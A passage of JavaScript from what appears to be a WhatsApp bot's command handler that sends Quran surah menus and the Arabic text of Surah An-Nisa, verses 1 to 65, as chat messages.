 text: "𝐀𝐋𝐈 '𝐈𝐌𝐑𝐀𝐍",
 url: `https://quran.com/3`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© ALI 'IMRAN"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© ALI 'IMRAN",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 1-200", id: `${prefix}ali-imran` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'an-nisa':
case 'annisa':
case 'nisa': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗡-𝗡𝗜𝗦𝗔\`
Surat ke-4 | 176 ayat | Madaniyah | Perempuan

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
يٰٓاَيُّهَا النَّاسُ اتَّقُوْا رَبَّكُمُ الَّذِيْ خَلَقَكُمْ مِّنْ نَّفْسٍ وَّاحِدَةٍ وَّخَلَقَ مِنْهَا زَوْجَهَا وَبَثَّ مِنْهُمَا رِجَالًا كَثِيْرًا وَّنِسَاۤءً ۚ وَاتَّقُوا اللّٰهَ الَّذِيْ تَسَاۤءَلُوْنَ بِهٖ وَالْاَرْحَامَ ۗ اِنَّ اللّٰهَ كَانَ عَلَيْكُمْ رَقِيْبًا
وَاٰتُوا الْيَتٰمٰٓى اَمْوَالَهُمْ وَلَا تَتَبَدَّلُوا الْخَبِيْثَ بِالطَّيِّبِ ۖ وَلَا تَأْكُلُوْٓا اَمْوَالَهُمْ اِلٰٓى اَمْوَالِكُمْ ۗ اِنَّهٗ كَانَ حُوْبًا كَبِيْرًا
وَاِنْ خِفْتُمْ اَلَّا تُقْسِطُوْا فِى الْيَتٰمٰى فَانْكِحُوْا مَا طَابَ لَكُمْ مِّنَ النِّسَاۤءِ مَثْنٰى وَثُلٰثَ وَرُبٰعَ ۚ فَاِنْ خِفْتُمْ اَلَّا تَعْدِلُوْا فَوَاحِدَةً اَوْ مَا مَلَكَتْ اَيْمَانُكُمْ ۗ ذٰلِكَ اَدْنٰٓى اَلَّا تَعُوْلُوْا
وَاٰتُوا النِّسَاۤءَ صَدُقٰتِهِنَّ نِحْلَةً ۗ فَاِنْ طِبْنَ لَكُمْ عَنْ شَيْءٍ مِّنْهُ نَفْسًا فَكُلُوْهُ هَنِيْۤـًٔا مَّرِيْۤـًٔا
وَلَا تُؤْتُوا السُّفَهَاۤءَ اَمْوَالَكُمُ الَّتِيْ جَعَلَ اللّٰهُ لَكُمْ قِيٰمًا وَّارْزُقُوْهُمْ فِيْهَا وَاكْسُوْهُمْ وَقُوْلُوْا لَهُمْ قَوْلًا مَّعْرُوْفًا
وَابْتَلُوا الْيَتٰمٰى حَتّٰىٓ اِذَا بَلَغُوا النِّكَاحَ ۚ فَاِنْ اٰنَسْتُمْ مِّنْهُمْ رُشْدًا فَادْفَعُوْٓا اِلَيْهِمْ اَمْوَالَهُمْ ۚ وَلَا تَأْكُلُوْهَا اِسْرَافًا وَّبِدَارًا اَنْ يَّكْبَرُوْا ۗ وَمَنْ كَانَ غَنِيًّا فَلْيَسْتَعْفِفْ ۚ وَمَنْ كَانَ فَقِيْرًا فَلْيَأْكُلْ بِالْمَعْرُوْفِ ۗ فَاِذَا دَفَعْتُمْ اِلَيْهِمْ اَمْوَالَهُمْ فَاَشْهِدُوْا عَلَيْهِمْ ۗ وَكَفٰى بِاللّٰهِ حَسِيْبًا
لِلرِّجَالِ نَصِيْبٌ مِّمَّا تَرَكَ الْوَالِدٰنِ وَالْاَقْرَبُوْنَ ۖ وَلِلنِّسَاۤءِ نَصِيْبٌ مِّمَّا تَرَكَ الْوَالِدٰنِ وَالْاَقْرَبُوْنَ مِمَّا قَلَّ مِنْهُ اَوْ كَثُرَ ۗ نَصِيْبًا مَّفْرُوْضًا
وَاِذَا حَضَرَ الْقِسْمَةَ اُولُوا الْقُرْبٰى وَالْيَتٰمٰى وَالْمَسٰكِيْنُ فَارْزُقُوْهُمْ مِّنْهُ وَقُوْلُوْا لَهُمْ قَوْلًا مَّعْرُوْفًا
وَلْيَخْشَ الَّذِيْنَ لَوْ تَرَكُوْا مِنْ خَلْفِهِمْ ذُرِّيَّةً ضِعٰفًا خَافُوْا عَلَيْهِمْ ۖ فَلْيَتَّقُوا اللّٰهَ وَلْيَقُوْلُوْا قَوْلًا سَدِيْدًا
اِنَّ الَّذِيْنَ يَأْكُلُوْنَ اَمْوَالَ الْيَتٰمٰى ظُلْمًا اِنَّمَا يَأْكُلُوْنَ فِيْ بُطُوْنِهِمْ نَارًا ۗ وَسَيَصْلَوْنَ سَعِيْرًا
يُوْصِيْكُمُ اللّٰهُ فِيْٓ اَوْلَادِكُمْ ۖ لِلذَّكَرِ مِثْلُ حَظِّ الْاُنْثَيَيْنِ ۚ فَاِنْ كُنَّ نِسَاۤءً فَوْقَ اثْنَتَيْنِ فَلَهُنَّ ثُلُثَا مَا تَرَكَ ۚ وَاِنْ كَانَتْ وَاحِدَةً فَلَهَا النِّصْفُ ۗ وَلِاَبَوَيْهِ لِكُلِّ وَاحِدٍ مِّنْهُمَا السُّدُسُ مِمَّا تَرَكَ اِنْ كَانَ لَهٗ وَلَدٌ ۚ فَاِنْ لَّمْ يَكُنْ لَّهٗ وَلَدٌ وَّوَرِثَهٗٓ اَبَوٰهُ فَلِاُمِّهِ الثُّلُثُ ۚ فَاِنْ كَانَ لَهٗٓ اِخْوَةٌ فَلِاُمِّهِ السُّدُسُ مِنْۢ بَعْدِ وَصِيَّةٍ يُّوْصِيْ بِهَآ اَوْ دَيْنٍ ۗ اٰبَاۤؤُكُمْ وَاَبْنَاۤؤُكُمْ لَا تَدْرُوْنَ اَيُّهُمْ اَقْرَبُ لَكُمْ نَفْعًا ۗ فَرِيْضَةً مِّنَ اللّٰهِ ۗ اِنَّ اللّٰهَ كَانَ عَلِيْمًا حَكِيْمًا
وَلَكُمْ نِصْفُ مَا تَرَكَ اَزْوَاجُكُمْ اِنْ لَّمْ يَكُنْ لَّهُنَّ وَلَدٌ ۚ فَاِنْ كَانَ لَهُنَّ وَلَدٌ فَلَكُمُ الرُّبُعُ مِمَّا تَرَكْنَ مِنْۢ بَعْدِ وَصِيَّةٍ يُّوْصِيْنَ بِهَآ اَوْ دَيْنٍ ۗ وَلَهُنَّ الرُّبُعُ مِمَّا تَرَكْتُمْ اِنْ لَّمْ يَكُنْ لَّكُمْ وَلَدٌ ۚ فَاِنْ كَانَ لَكُمْ وَلَدٌ فَلَهُنَّ الثُّمُنُ مِمَّا تَرَكْتُمْ مِّنْۢ بَعْدِ وَصِيَّةٍ تُوْصُوْنَ بِهَآ اَوْ دَيْنٍ ۗ وَاِنْ كَانَ رَجُلٌ يُّوْرَثُ كَلٰلَةً اَوِ امْرَاَةٌ وَّلَهٗٓ اَخٌ اَوْ اُخْتٌ فَلِكُلِّ وَاحِدٍ مِّنْهُمَا السُّدُسُ ۚ فَاِنْ كَانُوْٓا اَكْثَرَ مِنْ ذٰلِكَ فَهُمْ شُرَكَاۤءُ فِى الثُّلُثِ مِنْۢ بَعْدِ وَصِيَّةٍ يُّوْصٰى بِهَآ اَوْ دَيْنٍ غَيْرَ مُضَاۤرٍّ ۚ وَصِيَّةً مِّنَ اللّٰهِ ۗ وَاللّٰهُ عَلِيْمٌ حَلِيْمٌ
تِلْكَ حُدُوْدُ اللّٰهِ ۗ وَمَنْ يُّطِعِ اللّٰهَ وَرَسُوْلَهٗ يُدْخِلْهُ جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا ۗ وَذٰلِكَ الْفَوْزُ الْعَظِيْمُ
وَمَنْ يَّعْصِ اللّٰهَ وَرَسُوْلَهٗ وَيَتَعَدَّ حُدُوْدَهٗ يُدْخِلْهُ نَارًا خَالِدًا فِيْهَا ۖ وَلَهٗ عَذَابٌ مُّهِيْنٌ
وَالّٰتِيْ يَأْتِيْنَ الْفَاحِشَةَ مِنْ نِّسَاۤىِٕكُمْ فَاسْتَشْهِدُوْا عَلَيْهِنَّ اَرْبَعَةً مِّنْكُمْ ۚ فَاِنْ شَهِدُوْا فَاَمْسِكُوْهُنَّ فِى الْبُيُوْتِ حَتّٰى يَتَوَفّٰىهُنَّ الْمَوْتُ اَوْ يَجْعَلَ اللّٰهُ لَهُنَّ سَبِيْلًا
وَاللَّذٰنِ يَأْتِيٰنِهَا مِنْكُمْ فَاٰذُوْهُمَا ۚ فَاِنْ تَابَا وَاَصْلَحَا فَاَعْرِضُوْا عَنْهُمَا ۗ اِنَّ اللّٰهَ كَانَ تَوَّابًا رَّحِيْمًا
اِنَّمَا التَّوْبَةُ عَلَى اللّٰهِ لِلَّذِيْنَ يَعْمَلُوْنَ السُّوْۤءَ بِجَهَالَةٍ ثُمَّ يَتُوْبُوْنَ مِنْ قَرِيْبٍ فَاُولٰۤىِٕكَ يَتُوْبُ اللّٰهُ عَلَيْهِمْ ۗ وَكَانَ اللّٰهُ عَلِيْمًا حَكِيْمًا
وَلَيْسَتِ التَّوْبَةُ لِلَّذِيْنَ يَعْمَلُوْنَ السَّيِّاٰتِ ۚ حَتّٰىٓ اِذَا حَضَرَ اَحَدَهُمُ الْمَوْتُ قَالَ اِنِّيْ تُبْتُ الْـٰٔنَ وَلَا الَّذِيْنَ يَمُوْتُوْنَ وَهُمْ كُفَّارٌ ۗ اُولٰۤىِٕكَ اَعْتَدْنَا لَهُمْ عَذَابًا اَلِيْمًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا يَحِلُّ لَكُمْ اَنْ تَرِثُوا النِّسَاۤءَ كَرْهًا ۗ وَلَا تَعْضُلُوْهُنَّ لِتَذْهَبُوْا بِبَعْضِ مَآ اٰتَيْتُمُوْهُنَّ اِلَّآ اَنْ يَّأْتِيْنَ بِفَاحِشَةٍ مُّبَيِّنَةٍ ۚ وَعَاشِرُوْهُنَّ بِالْمَعْرُوْفِ ۚ فَاِنْ كَرِهْتُمُوْهُنَّ فَعَسٰٓى اَنْ تَكْرَهُوْا شَيْـًٔا وَّيَجْعَلَ اللّٰهُ فِيْهِ خَيْرًا كَثِيْرًا
وَاِنْ اَرَدْتُّمُ اسْتِبْدَالَ زَوْجٍ مَّكَانَ زَوْجٍ ۙ وَّاٰتَيْتُمْ اِحْدٰىهُنَّ قِنْطَارًا فَلَا تَأْخُذُوْا مِنْهُ شَيْـًٔا ۗ اَتَأْخُذُوْنَهٗ بُهْتَانًا وَّاِثْمًا مُّبِيْنًا
وَكَيْفَ تَأْخُذُوْنَهٗ وَقَدْ اَفْضٰى بَعْضُكُمْ اِلٰى بَعْضٍ وَّاَخَذْنَ مِنْكُمْ مِّيْثَاقًا غَلِيْظًا
وَلَا تَنْكِحُوْا مَا نَكَحَ اٰبَاۤؤُكُمْ مِّنَ النِّسَاۤءِ اِلَّا مَا قَدْ سَلَفَ ۗ اِنَّهٗ كَانَ فَاحِشَةً وَّمَقْتًا ۗ وَسَاۤءَ سَبِيْلًا
حُرِّمَتْ عَلَيْكُمْ اُمَّهٰتُكُمْ وَبَنٰتُكُمْ وَاَخَوٰتُكُمْ وَعَمّٰتُكُمْ وَخٰلٰتُكُمْ وَبَنٰتُ الْاَخِ وَبَنٰتُ الْاُخْتِ وَاُمَّهٰتُكُمُ الّٰتِيْٓ اَرْضَعْنَكُمْ وَاَخَوٰتُكُمْ مِّنَ الرَّضَاعَةِ وَاُمَّهٰتُ نِسَاۤىِٕكُمْ وَرَبَاۤىِٕبُكُمُ الّٰتِيْ فِيْ حُجُوْرِكُمْ مِّنْ نِّسَاۤىِٕكُمُ الّٰتِيْ دَخَلْتُمْ بِهِنَّ ۖ فَاِنْ لَّمْ تَكُوْنُوْا دَخَلْتُمْ بِهِنَّ فَلَا جُنَاحَ عَلَيْكُمْ ۖ وَحَلَاۤىِٕلُ اَبْنَاۤىِٕكُمُ الَّذِيْنَ مِنْ اَصْلَابِكُمْۙ وَاَنْ تَجْمَعُوْا بَيْنَ الْاُخْتَيْنِ اِلَّا مَا قَدْ سَلَفَ ۗ اِنَّ اللّٰهَ كَانَ غَفُوْرًا رَّحِيْمًا
وَّالْمُحْصَنٰتُ مِنَ النِّسَاۤءِ اِلَّا مَا مَلَكَتْ اَيْمَانُكُمْ ۚ كِتٰبَ اللّٰهِ عَلَيْكُمْ ۚ وَاُحِلَّ لَكُمْ مَّا وَرَاۤءَ ذٰلِكُمْ اَنْ تَبْتَغُوْا بِاَمْوَالِكُمْ مُّحْصِنِيْنَ غَيْرَ مُسَافِحِيْنَ ۗ فَمَا اسْتَمْتَعْتُمْ بِهٖ مِنْهُنَّ فَاٰتُوْهُنَّ اُجُوْرَهُنَّ فَرِيْضَةً ۗ وَلَا جُنَاحَ عَلَيْكُمْ فِيْمَا تَرَاضَيْتُمْ بِهٖ مِنْۢ بَعْدِ الْفَرِيْضَةِ ۗ اِنَّ اللّٰهَ كَانَ عَلِيْمًا حَكِيْمًا
وَمَنْ لَّمْ يَسْتَطِعْ مِنْكُمْ طَوْلًا اَنْ يَّنْكِحَ الْمُحْصَنٰتِ الْمُؤْمِنٰتِ فَمِنْ مَّا مَلَكَتْ اَيْمَانُكُمْ مِّنْ فَتَيٰتِكُمُ الْمُؤْمِنٰتِ ۗ وَاللّٰهُ اَعْلَمُ بِاِيْمَانِكُمْ ۗ بَعْضُكُمْ مِّنْۢ بَعْضٍ ۚ فَانْكِحُوْهُنَّ بِاِذْنِ اَهْلِهِنَّ وَاٰتُوْهُنَّ اُجُوْرَهُنَّ بِالْمَعْرُوْفِ مُحْصَنٰتٍ غَيْرَ مُسٰفِحٰتٍ وَّلَا مُتَّخِذٰتِ اَخْدَانٍ ۗ فَاِذَآ اُحْصِنَّ فَاِنْ اَتَيْنَ بِفَاحِشَةٍ فَعَلَيْهِنَّ نِصْفُ مَا عَلَى الْمُحْصَنٰتِ مِنَ الْعَذَابِ ۗ ذٰلِكَ لِمَنْ خَشِيَ الْعَنَتَ مِنْكُمْ ۗ وَاَنْ تَصْبِرُوْا خَيْرٌ لَّكُمْ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
يُرِيْدُ اللّٰهُ لِيُبَيِّنَ لَكُمْ وَيَهْدِيَكُمْ سُنَنَ الَّذِيْنَ مِنْ قَبْلِكُمْ وَيَتُوْبَ عَلَيْكُمْ ۗ وَاللّٰهُ عَلِيْمٌ حَكِيْمٌ
وَاللّٰهُ يُرِيْدُ اَنْ يَّتُوْبَ عَلَيْكُمْ ۖ وَيُرِيْدُ الَّذِيْنَ يَتَّبِعُوْنَ الشَّهَوٰتِ اَنْ تَمِيْلُوْا مَيْلًا عَظِيْمًا
يُرِيْدُ اللّٰهُ اَنْ يُّخَفِّفَ عَنْكُمْ ۚ وَخُلِقَ الْاِنْسَانُ ضَعِيْفًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَأْكُلُوْٓا اَمْوَالَكُمْ بَيْنَكُمْ بِالْبَاطِلِ اِلَّآ اَنْ تَكُوْنَ تِجَارَةً عَنْ تَرَاضٍ مِّنْكُمْ ۚ وَلَا تَقْتُلُوْٓا اَنْفُسَكُمْ ۗ اِنَّ اللّٰهَ كَانَ بِكُمْ رَحِيْمًا
وَمَنْ يَّفْعَلْ ذٰلِكَ عُدْوَانًا وَّظُلْمًا فَسَوْفَ نُصْلِيْهِ نَارًا ۗ وَكَانَ ذٰلِكَ عَلَى اللّٰهِ يَسِيْرًا
اِنْ تَجْتَنِبُوْا كَبَاۤىِٕرَ مَا تُنْهَوْنَ عَنْهُ نُكَفِّرْ عَنْكُمْ سَيِّاٰتِكُمْ وَنُدْخِلْكُمْ مُّدْخَلًا كَرِيْمًا
وَلَا تَتَمَنَّوْا مَا فَضَّلَ اللّٰهُ بِهٖ بَعْضَكُمْ عَلٰى بَعْضٍ ۗ لِلرِّجَالِ نَصِيْبٌ مِّمَّا اكْتَسَبُوْا ۚ وَلِلنِّسَاۤءِ نَصِيْبٌ مِّمَّا اكْتَسَبْنَ ۗ وَسْـَٔلُوا اللّٰهَ مِنْ فَضْلِهٖ ۗ اِنَّ اللّٰهَ كَانَ بِكُلِّ شَيْءٍ عَلِيْمًا
وَلِكُلٍّ جَعَلْنَا مَوَالِيَ مِمَّا تَرَكَ الْوَالِدٰنِ وَالْاَقْرَبُوْنَ ۗ وَالَّذِيْنَ عَقَدَتْ اَيْمَانُكُمْ فَاٰتُوْهُمْ نَصِيْبَهُمْ ۗ اِنَّ اللّٰهَ كَانَ عَلٰى كُلِّ شَيْءٍ شَهِيْدًا
اَلرِّجَالُ قَوَّامُوْنَ عَلَى النِّسَاۤءِ بِمَا فَضَّلَ اللّٰهُ بَعْضَهُمْ عَلٰى بَعْضٍ وَّبِمَآ اَنْفَقُوْا مِنْ اَمْوَالِهِمْ ۗ فَالصّٰلِحٰتُ قٰنِتٰتٌ حٰفِظٰتٌ لِّلْغَيْبِ بِمَا حَفِظَ اللّٰهُ ۗ وَالّٰتِيْ تَخَافُوْنَ نُشُوْزَهُنَّ فَعِظُوْهُنَّ وَاهْجُرُوْهُنَّ فِى الْمَضَاجِعِ وَاضْرِبُوْهُنَّ ۚ فَاِنْ اَطَعْنَكُمْ فَلَا تَبْغُوْا عَلَيْهِنَّ سَبِيْلًا ۗ اِنَّ اللّٰهَ كَانَ عَلِيًّا كَبِيْرًا
وَاِنْ خِفْتُمْ شِقَاقَ بَيْنِهِمَا فَابْعَثُوْا حَكَمًا مِّنْ اَهْلِهٖ وَحَكَمًا مِّنْ اَهْلِهَا ۚ اِنْ يُّرِيْدَآ اِصْلَاحًا يُّوَفِّقِ اللّٰهُ بَيْنَهُمَا ۗ اِنَّ اللّٰهَ كَانَ عَلِيْمًا خَبِيْرًا
وَاعْبُدُوا اللّٰهَ وَلَا تُشْرِكُوْا بِهٖ شَيْـًٔا ۖ وَّبِالْوَالِدَيْنِ اِحْسَانًا وَّبِذِى الْقُرْبٰى وَالْيَتٰمٰى وَالْمَسٰكِيْنِ وَالْجَارِ ذِى الْقُرْبٰى وَالْجَارِ الْجُنُبِ وَالصَّاحِبِ بِالْجَنْۢبِ وَابْنِ السَّبِيْلِ ۙ وَمَا مَلَكَتْ اَيْمَانُكُمْ ۗ اِنَّ اللّٰهَ لَا يُحِبُّ مَنْ كَانَ مُخْتَالًا فَخُوْرًا
اَلَّذِيْنَ يَبْخَلُوْنَ وَيَأْمُرُوْنَ النَّاسَ بِالْبُخْلِ وَيَكْتُمُوْنَ مَآ اٰتٰىهُمُ اللّٰهُ مِنْ فَضْلِهٖ ۗ وَاَعْتَدْنَا لِلْكٰفِرِيْنَ عَذَابًا مُّهِيْنًا
وَالَّذِيْنَ يُنْفِقُوْنَ اَمْوَالَهُمْ رِئَاۤءَ النَّاسِ وَلَا يُؤْمِنُوْنَ بِاللّٰهِ وَلَا بِالْيَوْمِ الْاٰخِرِ ۗ وَمَنْ يَّكُنِ الشَّيْطٰنُ لَهٗ قَرِيْنًا فَسَاۤءَ قَرِيْنًا
وَمَاذَا عَلَيْهِمْ لَوْ اٰمَنُوْا بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَاَنْفَقُوْا مِمَّا رَزَقَهُمُ اللّٰهُ ۗ وَكَانَ اللّٰهُ بِهِمْ عَلِيْمًا
اِنَّ اللّٰهَ لَا يَظْلِمُ مِثْقَالَ ذَرَّةٍ ۚ وَاِنْ تَكُ حَسَنَةً يُّضٰعِفْهَا وَيُؤْتِ مِنْ لَّدُنْهُ اَجْرًا عَظِيْمًا
فَكَيْفَ اِذَا جِئْنَا مِنْ كُلِّ اُمَّةٍ ۢ بِشَهِيْدٍ وَّجِئْنَا بِكَ عَلٰى هٰٓؤُلَاۤءِ شَهِيْدًا
يَوْمَىِٕذٍ يَّوَدُّ الَّذِيْنَ كَفَرُوْا وَعَصَوُا الرَّسُوْلَ لَوْ تُسَوّٰى بِهِمُ الْاَرْضُ ۗ وَلَا يَكْتُمُوْنَ اللّٰهَ حَدِيْثًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَقْرَبُوا الصَّلٰوةَ وَاَنْتُمْ سُكٰرٰى حَتّٰى تَعْلَمُوْا مَا تَقُوْلُوْنَ وَلَا جُنُبًا اِلَّا عَابِرِيْ سَبِيْلٍ حَتّٰى تَغْتَسِلُوْا ۗ وَاِنْ كُنْتُمْ مَّرْضٰىٓ اَوْ عَلٰى سَفَرٍ اَوْ جَاۤءَ اَحَدٌ مِّنْكُمْ مِّنَ الْغَاۤىِٕطِ اَوْ لٰمَسْتُمُ النِّسَاۤءَ فَلَمْ تَجِدُوْا مَاۤءً فَتَيَمَّمُوْا صَعِيْدًا طَيِّبًا فَامْسَحُوْا بِوُجُوْهِكُمْ وَاَيْدِيْكُمْ ۗ اِنَّ اللّٰهَ كَانَ عَفُوًّا غَفُوْرًا
اَلَمْ تَرَ اِلَى الَّذِيْنَ اُوْتُوْا نَصِيْبًا مِّنَ الْكِتٰبِ يَشْتَرُوْنَ الضَّلٰلَةَ وَيُرِيْدُوْنَ اَنْ تَضِلُّوا السَّبِيْلَ
وَاللّٰهُ اَعْلَمُ بِاَعْدَاۤىِٕكُمْ ۗ وَكَفٰى بِاللّٰهِ وَلِيًّا ۚ وَّكَفٰى بِاللّٰهِ نَصِيْرًا
مِنَ الَّذِيْنَ هَادُوْا يُحَرِّفُوْنَ الْكَلِمَ عَنْ مَّوَاضِعِهٖ وَيَقُوْلُوْنَ سَمِعْنَا وَعَصَيْنَا وَاسْمَعْ غَيْرَ مُسْمَعٍ وَّرَاعِنَا لَيًّا بِاَلْسِنَتِهِمْ وَطَعْنًا فِى الدِّيْنِ ۗ وَلَوْ اَنَّهُمْ قَالُوْا سَمِعْنَا وَاَطَعْنَا وَاسْمَعْ وَانْظُرْنَا لَكَانَ خَيْرًا لَّهُمْ وَاَقْوَمَ ۙ وَلٰكِنْ لَّعَنَهُمُ اللّٰهُ بِكُفْرِهِمْ فَلَا يُؤْمِنُوْنَ اِلَّا قَلِيْلًا
يٰٓاَيُّهَا الَّذِيْنَ اُوْتُوا الْكِتٰبَ اٰمِنُوْا بِمَا نَزَّلْنَا مُصَدِّقًا لِّمَا مَعَكُمْ مِّنْ قَبْلِ اَنْ نَّطْمِسَ وُجُوْهًا فَنَرُدَّهَا عَلٰٓى اَدْبَارِهَآ اَوْ نَلْعَنَهُمْ كَمَا لَعَنَّآ اَصْحٰبَ السَّبْتِ ۗ وَكَانَ اَمْرُ اللّٰهِ مَفْعُوْلًا
اِنَّ اللّٰهَ لَا يَغْفِرُ اَنْ يُّشْرَكَ بِهٖ وَيَغْفِرُ مَا دُوْنَ ذٰلِكَ لِمَنْ يَّشَاۤءُ ۚ وَمَنْ يُّشْرِكْ بِاللّٰهِ فَقَدِ افْتَرٰىٓ اِثْمًا عَظِيْمًا
اَلَمْ تَرَ اِلَى الَّذِيْنَ يُزَكُّوْنَ اَنْفُسَهُمْ ۗ بَلِ اللّٰهُ يُزَكِّيْ مَنْ يَّشَاۤءُ وَلَا يُظْلَمُوْنَ فَتِيْلًا
اُنْظُرْ كَيْفَ يَفْتَرُوْنَ عَلَى اللّٰهِ الْكَذِبَ ۗ وَكَفٰى بِهٖٓ اِثْمًا مُّبِيْنًا
اَلَمْ تَرَ اِلَى الَّذِيْنَ اُوْتُوْا نَصِيْبًا مِّنَ الْكِتٰبِ يُؤْمِنُوْنَ بِالْجِبْتِ وَالطَّاغُوْتِ وَيَقُوْلُوْنَ لِلَّذِيْنَ كَفَرُوْا هٰٓؤُلَاۤءِ اَهْدٰى مِنَ الَّذِيْنَ اٰمَنُوْا سَبِيْلًا
اُولٰۤىِٕكَ الَّذِيْنَ لَعَنَهُمُ اللّٰهُ ۚ وَمَنْ يَّلْعَنِ اللّٰهُ فَلَنْ تَجِدَ لَهٗ نَصِيْرًا
اَمْ لَهُمْ نَصِيْبٌ مِّنَ الْمُلْكِ فَاِذًا لَّا يُؤْتُوْنَ النَّاسَ نَقِيْرًا
اَمْ يَحْسُدُوْنَ النَّاسَ عَلٰى مَآ اٰتٰىهُمُ اللّٰهُ مِنْ فَضْلِهٖ ۚ فَقَدْ اٰتَيْنَآ اٰلَ اِبْرٰهِيْمَ الْكِتٰبَ وَالْحِكْمَةَ وَاٰتَيْنٰهُمْ مُّلْكًا عَظِيْمًا
فَمِنْهُمْ مَّنْ اٰمَنَ بِهٖ وَمِنْهُمْ مَّنْ صَدَّ عَنْهُ ۗ وَكَفٰى بِجَهَنَّمَ سَعِيْرًا
اِنَّ الَّذِيْنَ كَفَرُوْا بِاٰيٰتِنَا سَوْفَ نُصْلِيْهِمْ نَارًا ۗ كُلَّمَا نَضِجَتْ جُلُوْدُهُمْ بَدَّلْنٰهُمْ جُلُوْدًا غَيْرَهَا لِيَذُوْقُوا الْعَذَابَ ۗ اِنَّ اللّٰهَ كَانَ عَزِيْزًا حَكِيْمًا
وَالَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ سَنُدْخِلُهُمْ جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَآ اَبَدًا ۗ لَهُمْ فِيْهَآ اَزْوَاجٌ مُّطَهَّرَةٌ ۙ وَّنُدْخِلُهُمْ ظِلًّا ظَلِيْلًا
اِنَّ اللّٰهَ يَأْمُرُكُمْ اَنْ تُؤَدُّوا الْاَمٰنٰتِ اِلٰٓى اَهْلِهَا ۙ وَاِذَا حَكَمْتُمْ بَيْنَ النَّاسِ اَنْ تَحْكُمُوْا بِالْعَدْلِ ۗ اِنَّ اللّٰهَ نِعِمَّا يَعِظُكُمْ بِهٖ ۗ اِنَّ اللّٰهَ كَانَ سَمِيْعًاۢ بَصِيْرًا
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اَطِيْعُوا اللّٰهَ وَاَطِيْعُوا الرَّسُوْلَ وَاُولِى الْاَمْرِ مِنْكُمْ ۚ فَاِنْ تَنَازَعْتُمْ فِيْ شَيْءٍ فَرُدُّوْهُ اِلَى اللّٰهِ وَالرَّسُوْلِ اِنْ كُنْتُمْ تُؤْمِنُوْنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ ۗ ذٰلِكَ خَيْرٌ وَّاَحْسَنُ تَأْوِيْلًا
اَلَمْ تَرَ اِلَى الَّذِيْنَ يَزْعُمُوْنَ اَنَّهُمْ اٰمَنُوْا بِمَآ اُنْزِلَ اِلَيْكَ وَمَآ اُنْزِلَ مِنْ قَبْلِكَ يُرِيْدُوْنَ اَنْ يَّتَحَاكَمُوْٓا اِلَى الطَّاغُوْتِ وَقَدْ اُمِرُوْٓا اَنْ يَّكْفُرُوْا بِهٖ ۗ وَيُرِيْدُ الشَّيْطٰنُ اَنْ يُّضِلَّهُمْ ضَلٰلًاۢ بَعِيْدًا
وَاِذَا قِيْلَ لَهُمْ تَعَالَوْا ِلٰى مَآ اَنْزَلَ اللّٰهُ وَاِلَى الرَّسُوْلِ رَاَيْتَ الْمُنٰفِقِيْنَ يَصُدُّوْنَ عَنْكَ صُدُوْدًا
فَكَيْفَ اِذَآ اَصَابَتْهُمْ مُّصِيْبَةٌۢ بِمَا قَدَّمَتْ اَيْدِيْهِمْ ثُمَّ جَاۤءُوْكَ يَحْلِفُوْنَ بِاللّٰهِ ۙ اِنْ اَرَدْنَآ اِلَّآ اِحْسَانًا وَّتَوْفِيْقًا
اُولٰۤىِٕكَ الَّذِيْنَ يَعْلَمُ اللّٰهُ مَا فِيْ قُلُوْبِهِمْ فَاَعْرِضْ عَنْهُمْ وَعِظْهُمْ وَقُلْ لَّهُمْ فِيْٓ اَنْفُسِهِمْ قَوْلًا بَلِيْغًا
وَمَآ اَرْسَلْنَا مِنْ رَّسُوْلٍ اِلَّا لِيُطَاعَ بِاِذْنِ اللّٰهِ ۗ وَلَوْ اَنَّهُمْ اِذْ ظَّلَمُوْٓا اَنْفُسَهُمْ جَاۤءُوْكَ فَاسْتَغْفَرُوا اللّٰهَ وَاسْتَغْفَرَ لَهُمُ الرَّسُوْلُ لَوَجَدُوا اللّٰهَ تَوَّابًا رَّحِيْمًا
فَلَا وَرَبِّكَ لَا يُؤْمِنُوْنَ حَتّٰى يُحَكِّمُوْكَ فِيْمَا شَجَرَ بَيْنَهُمْ ثُمَّ لَا يَجِدُوْا فِيْٓ اَنْفُسِهِمْ حَرَجًا مِّمَّا قَضَيْتَ وَيُسَلِّمُوْا تَسْلِيْمًا
